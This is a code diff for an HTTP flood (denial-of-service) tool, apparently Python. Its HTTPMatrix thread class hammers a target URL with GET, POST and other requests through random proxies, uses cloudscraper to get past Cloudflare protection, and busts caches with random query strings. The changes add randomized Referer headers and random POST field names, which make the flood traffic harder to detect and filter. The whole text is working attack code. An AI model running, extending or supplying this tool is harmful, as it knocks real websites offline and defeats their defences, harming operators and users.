@@ -2,7 +2,7 @@
 import threading
 import random
 import time
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 
 import cloudscraper
 import requests
@@ -27,11 +27,11 @@ class HTTPMatrix(threading.Thread):
             delay = random.uniform(0, 0.2)
         return delay
 
-    def build_headers(self):
-        return {
+    def build_headers(self, referer=None):
+        headers = {
             'User-Agent': get_random_user_agent(),
             'Accept': '*/*',
-            'Accept-Language': 'vi-VN,vi;q=0.9',
+            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
@@ -39,6 +39,9 @@ class HTTPMatrix(threading.Thread):
             'Pragma': 'no-cache',
             'Expires': '0',
         }
+        if referer:
+            headers['Referer'] = referer
+        return headers
 
     def run(self):
         config.attack_stats["active_threads"] += 1
@@ -46,8 +49,9 @@ class HTTPMatrix(threading.Thread):
         
         while not config.stop_event.is_set():
             proxy = get_random_proxy()
-            headers = self.build_headers()
-            # Dòng này đã được sửa lỗi, ép kiểu 1e12 thành số nguyên.
+            referer = urljoin(self.target_url, str(random.randint(1,1000)))
+            headers = self.build_headers(referer)
+            
             url_with_cache_bust = f"{self.target_url}?_={random.randint(1, int(1e12))}"
 
             try:
@@ -56,8 +60,9 @@ class HTTPMatrix(threading.Thread):
                 if method == 'GET':
                     response = self.scraper.get(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                 elif method == 'POST':
-                    payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(32))
-                    response = self.scraper.post(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT, data={"data": payload})
+                    payload_key = ''.join(random.choice('abcdef') for _ in range(8))
+                    payload_value = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(32))
+                    response = self.scraper.post(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT, data={payload_key: payload_value})
                 else:
                     response = self.scraper.request(method, url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                 
